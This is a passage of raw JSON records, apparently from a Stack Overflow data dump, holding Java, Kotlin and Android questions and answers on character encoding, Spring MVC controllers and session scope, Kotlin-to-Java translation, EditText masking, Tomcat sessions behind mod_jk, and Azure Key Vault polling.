ones)?  Where are you converting a byte array into a string, and why are you doing that?  It seems like you are doing a lot of steps that are part of your problem, but you left those steps out of your question."},{"owner":{"account_id":12612807,"reputation":5,"user_id":9171286,"display_name":"Ajay Sethi"},"score":0,"creation_date":1639616888,"post_id":70365376,"comment_id":124397386,"body_markdown":"Sorry I confused you but I didn&#39;t mention the all steps here because binary to text conversion is working fine except for the binary code as &quot;11101110&quot; , while I convert this binary code to text and print it in console, it gives question mark symbol in eclipse and even in txt file it shows the same.","body":"Sorry I confused you but I didn&#39;t mention the all steps here because binary to text conversion is working fine except for the binary code as &quot;11101110&quot; , while I convert this binary code to text and print it in console, it gives question mark symbol in eclipse and even in txt file it shows the same."}],"owner":{"account_id":12612807,"reputation":5,"user_id":9171286,"display_name":"Ajay Sethi"},"comment_count":10,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":199,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1639578562,"creation_date":1639578369,"question_id":70365376,"body_markdown":"I have a file containing the binary data and I&#39;m using Java to convert the binary data to text but I&#39;m getting question mark at few places in between. (these characters changes in every editor, like different char in eclipse and different in Intellij)\r\n\r\nSample Binary data - 00100000 11101110 10000000 10011110 01100101 01101110 00101100 00100000 01110100\r\nFor example the particular binary code (**11101110**) is not giving the correct character, using the below code for conversion\r\n\r\n    String raw = Arrays.stream(input.split(&quot; &quot;))\r\n                    .map(binary -&gt; Integer.parseInt(binary, 2))\r\n                    .map(Character::toString)\r\n                    .collect(Collectors.joining()); \r\n\r\nI tried converting to UTF-8, ISO_8859_1 and other encoding schemes too but it didn&#39;t help.\r\n\r\nKindly help.\r\n\r\n","title":"Getting ? and square box characters while converting binary data to text in java","body":"<p>I have a file containing the binary data and I'm using Java to convert the binary data to text but I'm getting question mark at few places in between. (these characters changes in every editor, like different char in eclipse and different in Intellij)</p>\n<p>Sample Binary data - 00100000 11101110 10000000 10011110 01100101 01101110 00101100 00100000 01110100\nFor example the particular binary code (<strong>11101110</strong>) is not giving the correct character, using the below code for conversion</p>\n<pre><code>String raw = Arrays.stream(input.split(&quot; &quot;))\n                .map(binary -&gt; Integer.parseInt(binary, 2))\n                .map(Character::toString)\n                .collect(Collectors.joining()); \n</code></pre>\n<p>I tried converting to UTF-8, ISO_8859_1 and other encoding schemes too but it didn't help.</p>\n<p>Kindly help.</p>\n"},{"tags":["java","spring-mvc","post"],"comments":[{"owner":{"account_id":22354823,"reputation":16499,"user_id":16572295,"display_name":"Jo&#227;o Dias"},"score":0,"creation_date":1639594394,"post_id":70365393,"comment_id":124391191,"body_markdown":"Can you please add the `DataField` code? Thanks!","body":"Can you please add the <code>DataField</code> code? Thanks!"},{"owner":{"account_id":23655315,"reputation":41,"user_id":17683701,"display_name":"AvocadoGirl"},"score":0,"creation_date":1640154493,"post_id":70365393,"comment_id":124525510,"body_markdown":"@Jo&#227;oDias DataField is basically like a separate class with Lombok annotations. Since I cannot create a new class only this one Controller class, I implemented it inside the Controller class.","body":"@Jo&#227;oDias DataField is basically like a separate class with Lombok annotations. Since I cannot create a new class only this one Controller class, I implemented it inside the Controller class."},{"owner":{"account_id":22354823,"reputation":16499,"user_id":16572295,"display_name":"Jo&#227;o Dias"},"score":0,"creation_date":1640171905,"post_id":70365393,"comment_id":124531105,"body_markdown":"Does the JSON that you send has a property named `content`?","body":"Does the JSON that you send has a property named <code>content</code>?"}],"owner":{"account_id":23655315,"reputation":41,"user_id":17683701,"display_name":"AvocadoGirl"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":31,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":0,"score":2,"last_activity_date":1639578446,"creation_date":1639578446,"question_id":70365393,"body_markdown":"I have been working with Spring MVC controllers and now I landed on a problem. So basically what I want to do is if I send a POST request with whatever the input is, I should get the exact same response what the input was.\r\n\r\nI have just this one controller and tried to do the following:\r\n\r\n```\r\nimport lombok.Data;\r\nimport org.springframework.ui.Model;\r\nimport org.springframework.web.bind.annotation.*;\r\n\r\n@RestController\r\npublic class Controller {\r\n\r\n    @Data\r\n    public class DataField {\r\n        public String content;\r\n    }\r\n\r\n    @GetMapping(&quot;/echo&quot;)\r\n    public void sayHello() {\r\n    }\r\n\r\n    @PostMapping(&quot;/echo&quot;)\r\n    public String postHello(@RequestBody DataField data) {\r\n        System.out.println(&quot;post: &quot; + data);\r\n        DataField content = data;\r\n        return content.content;\r\n}\r\n\r\n```\r\n\r\nIf I post something i.e \r\n```\r\nString inputJson = &quot;&quot;&quot;\r\n                {&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3}&quot;&quot;&quot;;\r\n```\r\nhow am I able to get the same response input back from the same address?\r\n\r\nCurrent error:\r\n\r\n```\r\nExpected: &quot;{\\&quot;a\\&quot;:1,\\&quot;b\\&quot;:2,\\&quot;c\\&quot;:3}&quot;\r\n     but: was &quot;&quot;\r\n```","title":"Unable to get same response data back from POST request in java","body":"<p>I have been working with Spring MVC controllers and now I landed on a problem. So basically what I want to do is if I send a POST request with whatever the input is, I should get the exact same response what the input was.</p>\n<p>I have just this one controller and tried to do the following:</p>\n<pre><code>import lombok.Data;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.*;\n\n@RestController\npublic class Controller {\n\n    @Data\n    public class DataField {\n        public String content;\n    }\n\n    @GetMapping(&quot;/echo&quot;)\n    public void sayHello() {\n    }\n\n    @PostMapping(&quot;/echo&quot;)\n    public String postHello(@RequestBody DataField data) {\n        System.out.println(&quot;post: &quot; + data);\n        DataField content = data;\n        return content.content;\n}\n\n</code></pre>\n<p>If I post something i.e</p>\n<pre><code>String inputJson = &quot;&quot;&quot;\n                {&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3}&quot;&quot;&quot;;\n</code></pre>\n<p>how am I able to get the same response input back from the same address?</p>\n<p>Current error:</p>\n<pre><code>Expected: &quot;{\\&quot;a\\&quot;:1,\\&quot;b\\&quot;:2,\\&quot;c\\&quot;:3}&quot;\n     but: was &quot;&quot;\n</code></pre>\n"},{"tags":["java","kotlin","lottie"],"comments":[{"owner":{"account_id":5644665,"reputation":35951,"user_id":4467208,"accept_rate":51,"display_name":"Murat Karag&#246;z"},"score":0,"creation_date":1508487099,"post_id":46844878,"comment_id":80637288,"body_markdown":"https://stackoverflow.com/questions/34957430/how-to-convert-a-kotlin-source-file-to-a-java-source-file","body":"<a href=\"https://stackoverflow.com/questions/34957430/how-to-convert-a-kotlin-source-file-to-a-java-source-file\" title=\"how to convert a kotlin source file to a java source file\">stackoverflow.com/questions/34957430/&hellip;</a>"},{"owner":{"account_id":177892,"reputation":5333,"user_id":2098493,"accept_rate":71,"display_name":"Woppi"},"score":0,"creation_date":1508487171,"post_id":46844878,"comment_id":80637320,"body_markdown":"@Murat K. It won&#39;t decompile. I tried this so I am currently manually translating the code.","body":"@Murat K. It won&#39;t decompile. I tried this so I am currently manually translating the code."}],"answers":[{"tags":[],"owner":{"account_id":1746128,"reputation":2925,"user_id":1596308,"accept_rate":78,"display_name":"Adam"},"down_vote_count":0,"up_vote_count":3,"is_accepted":true,"score":3,"last_activity_date":1508491817,"creation_date":1508489393,"answer_id":46845524,"question_id":46844878,"body_markdown":"The method setViewPagerScroller uses kotlin [anonymous inner class][1] syntax. That is the &#39;object&#39; part which has no real counterpart in java syntax.\r\n\r\n\tprivate void setViewPagerScroller() {\r\n\t\ttry {\r\n\t\t\tField scrollerField = ViewPager.class.getDeclaredField(&quot;mScroller&quot;);\r\n\t\t\tscrollerField.setAccessible(true);\r\n\r\n\t\t\tField interpolator = ViewPager.class.getDeclaredField(&quot;sInterpolator&quot;);\r\n\t\t\tinterpolator.setAccessible(true);\r\n\r\n\t\t\tScroller scroller = new Scroller(this, (android.view.animation.Interpolator) interpolator.get(null)){\r\n\r\n\t\t\t\t@Override\r\n\t\t\t\tpublic void startScroll(int startX, int startY, int dx, int dy, int duration) {\r\n\t\t\t\t\tsuper.startScroll(startX, startY, dx, dy, duration * 7);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t\tscrollerField.set(viewPager, scroller);\r\n\t\t} catch (NoSuchFieldException error) {\r\n\t\t\t// Do nothing.\r\n\t\t} catch (IllegalAccessException error) {\r\n\t\t\t// Do nothing.\r\n\t\t}\r\n\t}\r\n\r\nAnd the `as` keyword is like a casting in java. Hopefully you can use this to translate `fun generateFinalButtonBehaviour()`, it contains more of the same.\r\n\r\nThe [Lazy][2] construct unsurprisingly gets more verbose in java. You have to employ discipline to not access the viewpager wrongly if you choose to follow the structure below.\r\n\r\n\tprivate LockableViewPager viewPager;\r\n\r\n\tprivate LockableViewPager getViewPager(){\r\n\t\tif(viewPager == null){\r\n\t\t\t// produce viewpager and store in field\r\n\t\t}\r\n\t\treturn viewPager;\r\n\t}  \r\n\r\nYou can also use a class to more accurately represent a lazy initialization of your fields. (So that you cannot by mistake access a field which you meant to be lazily initialized) This gets even more verbose but could be worth it.\r\n\r\n  [1]: https://kotlinlang.org/docs/reference/nested-classes.html#anonymous-inner-classes\r\n  [2]: https://kotlinlang.org/docs/reference/delegated-properties.html#lazy","title":"How to interpret and translate a Lottie animation from Kotlin to Java?","body":"<p>The method setViewPagerScroller uses kotlin <a href=\"https://kotlinlang.org/docs/reference/nested-classes.html#anonymous-inner-classes\" rel=\"nofollow noreferrer\">anonymous inner class</a> syntax. That is the 'object' part which has no real counterpart in java syntax.</p>\n\n<pre><code>private void setViewPagerScroller() {\n    try {\n        Field scrollerField = ViewPager.class.getDeclaredField(\"mScroller\");\n        scrollerField.setAccessible(true);\n\n        Field interpolator = ViewPager.class.getDeclaredField(\"sInterpolator\");\n        interpolator.setAccessible(true);\n\n        Scroller scroller = new Scroller(this, (android.view.animation.Interpolator) interpolator.get(null)){\n\n            @Override\n            public void startScroll(int startX, int startY, int dx, int dy, int duration) {\n                super.startScroll(startX, startY, dx, dy, duration * 7);\n            }\n        }\n\n        scrollerField.set(viewPager, scroller);\n    } catch (NoSuchFieldException error) {\n        // Do nothing.\n    } catch (IllegalAccessException error) {\n        // Do nothing.\n    }\n}\n</code></pre>\n\n<p>And the <code>as</code> keyword is like a casting in java. Hopefully you can use this to translate <code>fun generateFinalButtonBehaviour()</code>, it contains more of the same.</p>\n\n<p>The <a href=\"https://kotlinlang.org/docs/reference/delegated-properties.html#lazy\" rel=\"nofollow noreferrer\">Lazy</a> construct unsurprisingly gets more verbose in java. You have to employ discipline to not access the viewpager wrongly if you choose to follow the structure below.</p>\n\n<pre><code>private LockableViewPager viewPager;\n\nprivate LockableViewPager getViewPager(){\n    if(viewPager == null){\n        // produce viewpager and store in field\n    }\n    return viewPager;\n}  \n</code></pre>\n\n<p>You can also use a class to more accurately represent a lazy initialization of your fields. (So that you cannot by mistake access a field which you meant to be lazily initialized) This gets even more verbose but could be worth it.</p>\n"}],"owner":{"account_id":177892,"reputation":5333,"user_id":2098493,"accept_rate":71,"display_name":"Woppi"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":600,"favorite_count":0,"down_vote_count":0,"up_vote_count":5,"accepted_answer_id":46845524,"answer_count":1,"score":5,"last_activity_date":1639578215,"creation_date":1508487040,"question_id":46844878,"body_markdown":"I have been trying to translate this Kotlin code to Java since the project is in Java. I am translating by looking into Kotlin syntax. However, there are still others that I am having a hard time understanding. \r\n\r\nhttps://github.com/airbnb/lottie-android/blob/master/LottieSample/src/main/kotlin/com/airbnb/lottie/samples/AppIntroActivity.kt\r\n\r\nSpecifically:\r\n\r\n    private val animationView: LottieAnimationView by lazy {\r\n        rootView.inflate(R.layout.app_intro_animation_view, false) as LottieAnimationView\r\n    }\r\n\r\n    private val viewPager: LockableViewPager by lazy {\r\n        findViewById&lt;LockableViewPager&gt;(R.id.intro_activity_viewPager)\r\n    }\r\n\r\n    override fun generateFinalButtonBehaviour(): IntroButton.Behaviour {\r\n        return object : IntroButton.Behaviour {\r\n            override fun setActivity(activity: IntroActivity) { finish() }\r\n            override fun getActivity(): IntroActivity? = null\r\n            override fun run() {}\r\n        }\r\n    }\r\n\r\n    private fun setViewPagerScroller() {\r\n        try {\r\n            val scrollerField = ViewPager::class.java.getDeclaredField(&quot;mScroller&quot;)\r\n            scrollerField.isAccessible = true\r\n            val interpolator = ViewPager::class.java.getDeclaredField(&quot;sInterpolator&quot;)\r\n            interpolator.isAccessible = true\r\n\r\n            val scroller = object : Scroller(this, interpolator.get(null) as Interpolator) {\r\n                override fun startScroll(startX: Int, startY: Int, dx: Int, dy: Int, duration: Int) {\r\n                    super.startScroll(startX, startY, dx, dy, duration * 7)\r\n                }\r\n            }\r\n            scrollerField.set(viewPager, scroller)\r\n        } catch (e: NoSuchFieldException) {\r\n            // Do nothing.\r\n        } catch (e: IllegalAccessException) {\r\n            // Do nothing.\r\n        }\r\n    }\r\n\r\nFor the `setViewPagerScroller`, I was able to translate the first part.\r\n            \r\n    Field scrollerField = ViewPager.class.getDeclaredField(&quot;mScroller&quot;);\r\n    scrollerField.setAccessible(true);\r\n\r\n    Field interpolator = ViewPager.class.getDeclaredField(&quot;sInterpolator&quot;);\r\n    interpolator.setAccessible(true);","title":"How to interpret and translate a Lottie animation from Kotlin to Java?","body":"<p>I have been trying to translate this Kotlin code to Java since the project is in Java. I am translating by looking into Kotlin syntax. However, there are still others that I am having a hard time understanding.</p>\n<p><a href=\"https://github.com/airbnb/lottie-android/blob/master/LottieSample/src/main/kotlin/com/airbnb/lottie/samples/AppIntroActivity.kt\" rel=\"nofollow noreferrer\">https://github.com/airbnb/lottie-android/blob/master/LottieSample/src/main/kotlin/com/airbnb/lottie/samples/AppIntroActivity.kt</a></p>\n<p>Specifically:</p>\n<pre><code>private val animationView: LottieAnimationView by lazy {\n    rootView.inflate(R.layout.app_intro_animation_view, false) as LottieAnimationView\n}\n\nprivate val viewPager: LockableViewPager by lazy {\n    findViewById&lt;LockableViewPager&gt;(R.id.intro_activity_viewPager)\n}\n\noverride fun generateFinalButtonBehaviour(): IntroButton.Behaviour {\n    return object : IntroButton.Behaviour {\n        override fun setActivity(activity: IntroActivity) { finish() }\n        override fun getActivity(): IntroActivity? = null\n        override fun run() {}\n    }\n}\n\nprivate fun setViewPagerScroller() {\n    try {\n        val scrollerField = ViewPager::class.java.getDeclaredField(&quot;mScroller&quot;)\n        scrollerField.isAccessible = true\n        val interpolator = ViewPager::class.java.getDeclaredField(&quot;sInterpolator&quot;)\n        interpolator.isAccessible = true\n\n        val scroller = object : Scroller(this, interpolator.get(null) as Interpolator) {\n            override fun startScroll(startX: Int, startY: Int, dx: Int, dy: Int, duration: Int) {\n                super.startScroll(startX, startY, dx, dy, duration * 7)\n            }\n        }\n        scrollerField.set(viewPager, scroller)\n    } catch (e: NoSuchFieldException) {\n        // Do nothing.\n    } catch (e: IllegalAccessException) {\n        // Do nothing.\n    }\n}\n</code></pre>\n<p>For the <code>setViewPagerScroller</code>, I was able to translate the first part.</p>\n<pre><code>Field scrollerField = ViewPager.class.getDeclaredField(&quot;mScroller&quot;);\nscrollerField.setAccessible(true);\n\nField interpolator = ViewPager.class.getDeclaredField(&quot;sInterpolator&quot;);\ninterpolator.setAccessible(true);\n</code></pre>\n"},{"tags":["java","android","kotlin","android-edittext","android-textinputedittext"],"comments":[{"owner":{"account_id":5198523,"reputation":415,"user_id":4158832,"accept_rate":60,"display_name":"ali73"},"score":0,"creation_date":1639554755,"post_id":70358875,"comment_id":124375485,"body_markdown":"try using `onTextChangedListener` and implementing `aftertTextChanged` method. I&#39;ve had implemented similar functionality for edit text.","body":"try using <code>onTextChangedListener</code> and implementing <code>aftertTextChanged</code> method. I&#39;ve had implemented similar functionality for edit text."}],"answers":[{"tags":[],"owner":{"account_id":23650220,"reputation":1,"user_id":17679201,"display_name":"VP21"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639577851,"creation_date":1639560914,"answer_id":70361329,"question_id":70358875,"body_markdown":"Already managed it myself by this approach. If you have or can optimize this solution feel free to answer.\r\n\r\n```kotlin\r\nvar isProgrammatic = false\r\nval origTextSize = 36f\r\nval totalDashes = &quot;- - - -&quot;.split(&quot; &quot;).size\r\n    \r\nvoucher_input.doAfterTextChanged {\r\n    if (!it.isNullOrBlank()) {\r\n        //No dashes here\r\n        var placeHolder = it.filterNot { c -&gt; &quot;-&quot;.contains(c)}.toString()\r\n    \r\n        Log.wtf(&quot;Plain&quot;, placeHolder)\r\n    \r\n        if (placeHolder.isBlank()) {\r\n            voucher_input.text = null //Use hint\r\n            return@doAfterTextChanged\r\n        }\r\n    \r\n        if (isProgrammatic) {\r\n            isProgrammatic = false\r\n            return@doAfterTextChanged\r\n        }\r\n    \r\n        if (placeHolder.length &lt; 4){\r\n            val cursor = placeHolder.length\r\n            val numDash =  totalDashes - placeHolder.length\r\n    \r\n            var dashes = &quot;&quot;\r\n            for (i in 1..numDash)\r\n                dashes += &quot;-&quot;\r\n    \r\n            placeHolder += dashes\r\n    \r\n            Log.wtf(&quot;Dashes&quot;, placeHolder)\r\n    \r\n            isProgrammatic = true\r\n            voucher_input.setText(placeHolder) //Modified input\r\n            voucher_input.setSelection(cursor) //Place cursor near at the end of alphanumeric\r\n    \r\n            return@doAfterTextChanged\r\n        }\r\n        else if (placeHolder.length == 4) {\r\n            isProgrammatic = true\r\n            voucher_input.setText(placeHolder) //Start normal input\r\n            voucher_input.setSelection(voucher_input.text!!.length) //Place cursor at the end\r\n        }\r\n    }\r\n}\r\n```","title":"EditText masking with dash","body":"<p>Already managed it myself by this approach. If you have or can optimize this solution feel free to answer.</p>\n<pre class=\"lang-kotlin prettyprint-override\"><code>var isProgrammatic = false\nval origTextSize = 36f\nval totalDashes = &quot;- - - -&quot;.split(&quot; &quot;).size\n    \nvoucher_input.doAfterTextChanged {\n    if (!it.isNullOrBlank()) {\n        //No dashes here\n        var placeHolder = it.filterNot { c -&gt; &quot;-&quot;.contains(c)}.toString()\n    \n        Log.wtf(&quot;Plain&quot;, placeHolder)\n    \n        if (placeHolder.isBlank()) {\n            voucher_input.text = null //Use hint\n            return@doAfterTextChanged\n        }\n    \n        if (isProgrammatic) {\n            isProgrammatic = false\n            return@doAfterTextChanged\n        }\n    \n        if (placeHolder.length &lt; 4){\n            val cursor = placeHolder.length\n            val numDash =  totalDashes - placeHolder.length\n    \n            var dashes = &quot;&quot;\n            for (i in 1..numDash)\n                dashes += &quot;-&quot;\n    \n            placeHolder += dashes\n    \n            Log.wtf(&quot;Dashes&quot;, placeHolder)\n    \n            isProgrammatic = true\n            voucher_input.setText(placeHolder) //Modified input\n            voucher_input.setSelection(cursor) //Place cursor near at the end of alphanumeric\n    \n            return@doAfterTextChanged\n        }\n        else if (placeHolder.length == 4) {\n            isProgrammatic = true\n            voucher_input.setText(placeHolder) //Start normal input\n            voucher_input.setSelection(voucher_input.text!!.length) //Place cursor at the end\n        }\n    }\n}\n</code></pre>\n"}],"owner":{"account_id":23650220,"reputation":1,"user_id":17679201,"display_name":"VP21"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":151,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1639577851,"creation_date":1639546630,"question_id":70358875,"body_markdown":"I want to create a mask with EditText, the goal is to have four (4) dashes at the beginning and when the user types each dashes will be replaced by the user input. I am thinking of using `splice` and `replace` but having a difficulty of proper handling with the backspace to delete inputs as well. What is the best approach for this?\r\n\r\nThis is how it should look like this\r\n[sample][1]\r\n\r\nNow the number of input is not limited to four (4) character as it has a maximum of 50 characters. So to demonstrate it should look like this:\r\n\r\nEg.\r\n1. A - - -\r\n2. A B - -\r\n3. A B C -\r\n4. A B C D\r\n5. A B C D E and so on\r\n\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/PFjJO.png","title":"EditText masking with dash","body":"<p>I want to create a mask with EditText, the goal is to have four (4) dashes at the beginning and when the user types each dashes will be replaced by the user input. I am thinking of using <code>splice</code> and <code>replace</code> but having a difficulty of proper handling with the backspace to delete inputs as well. What is the best approach for this?</p>\n<p>This is how it should look like this\n<a href=\"https://i.stack.imgur.com/PFjJO.png\" rel=\"nofollow noreferrer\">sample</a></p>\n<p>Now the number of input is not limited to four (4) character as it has a maximum of 50 characters. So to demonstrate it should look like this:</p>\n<p>Eg.</p>\n<ol>\n<li>A - - -</li>\n<li>A B - -</li>\n<li>A B C -</li>\n<li>A B C D</li>\n<li>A B C D E and so on</li>\n</ol>\n"},{"tags":["java","apache","tomcat","httpd.conf","mod-jk"],"answers":[{"tags":[],"owner":{"account_id":7701,"reputation":47163,"user_id":13447,"accept_rate":100,"display_name":"Olaf Kock"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1639577848,"creation_date":1639577848,"answer_id":70365239,"question_id":70356407,"body_markdown":"Apache httpd is - especially when mod_jk is in the game - a reverse proxy for Tomcat. It typically does little more than forwarding requests and responses.\r\n\r\nIf a tomcat-based web application requires a session, Tomcat will create the session and handle it typically with a cookie. This session information is part of the proxied content, which Apache httpd neither creates, deletes or manipulates (unless you *explicitly* configured it to do so, in which case you&#39;d knew that you did).\r\n\r\n*In case* Apache httpd has some other components (e.g. PHP based) that require sessions, this part of session handling would be subject to the PHP application.\r\n\r\nTomcat sessions behave the same, no matter if they&#39;re proxied or not. So, Apache httpd has (unless you cause it to) *no* effect on Tomcat sessions.","title":"Confused about session management between Apache httpd and Tomcat using mod_jk","body":"<p>Apache httpd is - especially when mod_jk is in the game - a reverse proxy for Tomcat. It typically does little more than forwarding requests and responses.</p>\n<p>If a tomcat-based web application requires a session, Tomcat will create the session and handle it typically with a cookie. This session information is part of the proxied content, which Apache httpd neither creates, deletes or manipulates (unless you <em>explicitly</em> configured it to do so, in which case you'd knew that you did).</p>\n<p><em>In case</em> Apache httpd has some other components (e.g. PHP based) that require sessions, this part of session handling would be subject to the PHP application.</p>\n<p>Tomcat sessions behave the same, no matter if they're proxied or not. So, Apache httpd has (unless you cause it to) <em>no</em> effect on Tomcat sessions.</p>\n"}],"owner":{"account_id":8215302,"reputation":27,"user_id":6181913,"display_name":"tim039"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":383,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70365239,"answer_count":1,"score":0,"last_activity_date":1639577848,"creation_date":1639521698,"question_id":70356407,"body_markdown":"I am confused about session management between Apache httpd and Tomcat using mod_jk. I know that Apache is typically used for serving http pages, and Tomcat is used as instructions for handling different types of web requests. So when an application using both of these receives a request, does Apache create a session where within that session a Tomcat session is created? I am asking this because none of the changes I make to sessions in my apache httpd.conf file seem to take affect, but the changes I make to my Tomcat config files do affect my application.","title":"Confused about session management between Apache httpd and Tomcat using mod_jk","body":"<p>I am confused about session management between Apache httpd and Tomcat using mod_jk. I know that Apache is typically used for serving http pages, and Tomcat is used as instructions for handling different types of web requests. So when an application using both of these receives a request, does Apache create a session where within that session a Tomcat session is created? I am asking this because none of the changes I make to sessions in my apache httpd.conf file seem to take affect, but the changes I make to my Tomcat config files do affect my application.</p>\n"},{"tags":["java","azure","azure-devops","azure-keyvault"],"answers":[{"tags":[],"owner":{"account_id":16609803,"reputation":31,"user_id":12003182,"display_name":"Manfred Riem"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639577732,"creation_date":1639577732,"answer_id":70365219,"question_id":70363789,"body_markdown":"Responses to the 2 questions:\r\n\r\n#1 How does the code snippet relate to the application.yml? You can call the SecretClient you create at any interval you like.\r\n\r\n#2 Use getSecret(String name) on the SecretClient API","title":"Get key vault secrets list only once at a startup","body":"<p>Responses to the 2 questions:</p>\n<p>#1 How does the code snippet relate to the application.yml? You can call the SecretClient you create at any interval you like.</p>\n<p>#2 Use getSecret(String name) on the SecretClient API</p>\n"}],"owner":{"account_id":15704117,"reputation":83,"user_id":11916606,"display_name":"Artem Causelove"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":193,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1639577732,"creation_date":1639571712,"question_id":70363789,"body_markdown":"What I want to achieve is polling a list of key vault values only once at the start of a microservice. Instead my program polls a list of secrets every 30 mins. \r\nThis is my client configuration:\r\n\r\n    public void init() {\r\n    secretClient = new SecretClientBuilder()\r\n            .vaultUrl(vaultAddress)\r\n            .credential(new ClientSecretCredentialBuilder()\r\n                    .clientId(clientId)\r\n                    .tenantId(tenantId)\r\n                    .clientSecret(clientSecret)\r\n                    .build())\r\n            .buildClient();\r\n}\r\n\r\n1.What refresh-interval should I use in application.yml in order to pull secrets list only once ?\r\n\r\n2. Is it possible to get secretValue by secretName without polling the whole secrets list ?\r\n","title":"Get key vault secrets list only once at a startup","body":"<p>What I want to achieve is polling a list of key vault values only once at the start of a microservice. Instead my program polls a list of secrets every 30 mins.\nThis is my client configuration:</p>\n<pre><code>public void init() {\nsecretClient = new SecretClientBuilder()\n        .vaultUrl(vaultAddress)\n        .credential(new ClientSecretCredentialBuilder()\n                .clientId(clientId)\n                .tenantId(tenantId)\n                .clientSecret(clientSecret)\n                .build())\n        .buildClient();\n</code></pre>\n<p>}</p>\n<p>1.What refresh-interval should I use in application.yml in order to pull secrets list only once ?</p>\n<ol start=\"2\">\n<li>Is it possible to get secretValue by secretName without polling the whole secrets list ?</li>\n</ol>\n"},{"tags":["java","spring-mvc"],"answers":[{"tags":[],"owner":{"account_id":9504657,"reputation":7440,"user_id":7064617,"display_name":"JCompetence"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1639576691,"creation_date":1639576365,"answer_id":70364868,"question_id":70364588,"body_markdown":"Could you try with using a Proxy,\r\n\r\n           @Scope(value = WebApplicationContext.SCOPE_SESSION,\r\n            proxyMode = ScopedProxyMode.TARGET_CLASS)\r\n\r\n\r\nExample:\r\n\r\n    @Component\r\n    @Scope(value = WebApplicationContext.SCOPE_SESSION, proxyMode = ScopedProxyMode.TARGET_CLASS)\r\n    public class VisitorInfo implements Serializable {\r\n      private String name;\r\n      private int visitCounter;\r\n      private LocalDateTime firstVisitTime;\r\n      //getters/setters\r\n        .............\r\n    }\r\n\r\n\r\n----------\r\n\r\n\r\nYou could also use the annotation `@SessionScope` which is the same as the above configuration: \r\n\r\n&gt;  &lt;p&gt;Specifically, {@code @SessionScope} is a &lt;em&gt;composed\r\n&gt; annotation&lt;/em&gt; that  acts as a shortcut for {@code&gt; @Scope(&quot;session&quot;)} with the default {@link #proxyMode} set to\r\n&gt; {@link ScopedProxyMode#TARGET_CLASS TARGET_CLASS}.\r\n\r\n\r\n\r\nhttps://github.com/Hunoob/Spring-Framework/blob/a7aa3dd2927e4e2ae470a639bc4b1fccd6315273/spring-web/src/main/java/org/springframework/web/context/annotation/SessionScope.java\r\n\r\n","title":"Store and retrieve an object in session through @Scope(&quot;session&quot;)","body":"<p>Could you try with using a Proxy,</p>\n<pre><code>       @Scope(value = WebApplicationContext.SCOPE_SESSION,\n        proxyMode = ScopedProxyMode.TARGET_CLASS)\n</code></pre>\n<p>Example:</p>\n<pre><code>@Component\n@Scope(value = WebApplicationContext.SCOPE_SESSION, proxyMode = ScopedProxyMode.TARGET_CLASS)\npublic class VisitorInfo implements Serializable {\n  private String name;\n  private int visitCounter;\n  private LocalDateTime firstVisitTime;\n  //getters/setters\n    .............\n}\n</code></pre>\n<hr />\n<p>You could also use the annotation <code>@SessionScope</code> which is the same as the above configuration:</p>\n<blockquote>\n <p>Specifically, {@code @SessionScope} is a <em>composed\nannotation</em> that  acts as a shortcut for {@code> @Scope(\"session\")} with the default {@link #proxyMode} set to\n{@link ScopedProxyMode#TARGET_CLASS TARGET_CLASS}.\n</blockquote>\n<p><a href=\"https://github.com/Hunoob/Spring-Framework/blob/a7aa3dd2927e4e2ae470a639bc4b1fccd6315273/spring-web/src/main/java/org/springframework/web/context/annotation/SessionScope.java\" rel=\"nofollow noreferrer\">https://github.com/Hunoob/Spring-Framework/blob/a7aa3dd2927e4e2ae470a639bc4b1fccd6315273/spring-web/src/main/java/org/springframework/web/context/annotation/SessionScope.java</a></p>\n"},{"tags":[],"owner":{"account_id":19070122,"reputation":109,"user_id":13924481,"display_name":"Little Bug"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1639577593,"creation_date":1639577593,"answer_id":70365189,"question_id":70364588,"body_markdown":"I think the NullPointerException is caused by you didn&#39;t initialize the &quot;productlist&quot;. You can try something like this: &quot;**private HashMap&lt;Integer,Product&gt; productlist = new HashMap&lt;&gt;();**&quot;.\r\n\r\nIt&#39;s ok to use the &quot;session scope&quot; on the cart without specifying the &quot;proxyMode&quot; attribute of the &quot;@Scope&quot; annotation, if the &quot;request scope&quot; controller is the only bean has an dependency on it. \r\n\r\nBut usually the Controller should be &quot;singleton&quot; scope, unless you have a good reason for choosing another kind of scope. And if the Controller is &quot;singleton&quot; scope, you should specify the &quot;proxyMode&quot; attribute of the &quot;@Scope&quot; annotation.","title":"Store and retrieve an object in session through @Scope(&quot;session&quot;)","body":"<p>I think the NullPointerException is caused by you didn't initialize the &quot;productlist&quot;. You can try something like this: &quot;<strong>private HashMap&lt;Integer,Product&gt; productlist = new HashMap&lt;&gt;();</strong>&quot;.</p>\n<p>It's ok to use the &quot;session scope&quot; on the cart without specifying the &quot;proxyMode&quot; attribute of the &quot;@Scope&quot; annotation, if the 